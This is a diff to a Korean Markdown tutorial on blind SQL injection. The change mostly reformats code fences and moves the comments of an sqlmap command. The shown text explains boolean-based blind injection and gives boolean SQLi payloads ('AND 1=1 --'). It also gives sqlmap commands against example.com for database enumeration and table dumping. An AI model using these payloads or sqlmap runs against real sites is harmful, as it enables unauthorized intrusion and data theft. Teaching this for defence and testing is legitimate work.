@@ -17,7 +17,7 @@ draft: false
 
 직접적인 쿼리 결과 반환 없이 간접적 신호로 데이터를 추출하는 기법이다. "응답 코드가 200이면 조건이 참이다"처럼 Yes/No 신호를 반복 질문해 데이터를 한 글자씩 추론한다.
 
-```
+```text
 [공격자 질문] → 서버: "users 테이블의 admin 비밀번호 첫 글자가 'a'보다 큰가?"
 [서버 응답]   → 200 (True) 또는 404 (False)
 [공격자]      → 이진 탐색으로 범위 좁히기 → 약 7번이면 1글자 확정
@@ -28,7 +28,7 @@ draft: false
 
 응답의 구조적 차이(HTTP 상태 코드, 콘텐츠 길이, 특정 키워드 존재 여부)를 참/거짓 신호로 사용한다.
 
-```
+```text
 ?id=1 AND 1=1 --   → 정상 페이지 (True)
 ?id=1 AND 1=2 --   → 빈 페이지 또는 에러 (False)
 ```
@@ -85,11 +85,13 @@ OOB는 DB 계정에 강력한 권한이 있을 때만 가능하지만, 완전히
 sqlmap -u "https://example.com/item?id=1" --dbs
 
 # 블라인드 전용 기법
+# --technique=B,T: Boolean + Time 기법만 / --level=3: 탐지 깊이
+# --risk=2: 위험도 (2=중간, 3=high - 주의) / --dbms=mysql: DB 종류 명시 시 빠름
 sqlmap -u "https://example.com/item?id=1" \
-  --technique=B,T \   # Boolean + Time 기법만
-  --level=3 \         # 탐지 깊이
-  --risk=2 \          # 위험도 (2=중간, 3=high - 주의)
-  --dbms=mysql        # DB 종류 명시 시 빠름
+  --technique=B,T \
+  --level=3 \
+  --risk=2 \
+  --dbms=mysql
 
 # 특정 테이블 덤프
 sqlmap -u "https://example.com/item?id=1" \
